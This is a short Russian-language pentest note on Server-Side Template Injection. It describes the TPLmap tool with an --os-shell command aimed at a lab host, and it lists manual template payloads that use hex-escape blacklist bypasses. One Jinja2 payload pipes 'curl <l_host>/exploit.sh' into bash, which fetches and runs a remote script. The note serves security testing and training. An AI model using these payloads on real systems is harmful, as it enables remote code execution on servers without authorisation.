## TPLmap
[epinna/tplmap (github.com)](https://github.com/epinna/tplmap)

TPLmap – инструмент на Python для автоматического выявления и эксплуатации уязвимостей Server-Side Template Injection. TPLmap имеет схожие с SQLmap настройки и флаги. Использует несколько различных техник и векторов (включая blind-инъекции), а также техники выполнения кода и загрузки/выгрузки произвольных файлов.

TPLmap имеет в своем арсенале техники для десятка разных движков и шаблонов. А также обладает некоторыми техниками для поиска eval()-подобных инъекций кода в Python, Ruby, PHP, JavaScript. В случае успешной эксплуатации открывает интерактивную консоль.
### Как использовать TPLmap?
- В командной строке введите команду:

```
./tplmap.py --os-shell -u http://www.hacktory.lab/
```

где,

- `./tplmap.py` – исполняемый файл программы;
- `-u --url http://www.hacktory.lab/` – URL цели;
- `--os-shell` – запускает псевдотерминал в целевой операционной системе для выполнения желаемых кодов и команд.

## Ручное тестирование [Server Side Template Injection Payloads](https://github.com/payloadbox/ssti-payloads)

![[Pasted image 20241209180532.png]]

Payload можно изменять для обхода защиты чёрного списка. А именно:
**Замена "_" на “\\x5f” и "." на "\\x2E" или объединение строк массивов. Пример:** 
```
{{"".__class__}}  
{{""["\x5f\x5fclass\x5f\x5f"]}}
```
```
{{''.__class__.__mro__[1].__subclasses__()[287]}}  
{{""["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fmro\x5f\x5f"][1]["\x5f\x5fsubclasses\x5f\x5f"]()[365]('curl <l_host>/exploit.sh|bash',shell=True,stdout=-1).communicate()}}
```
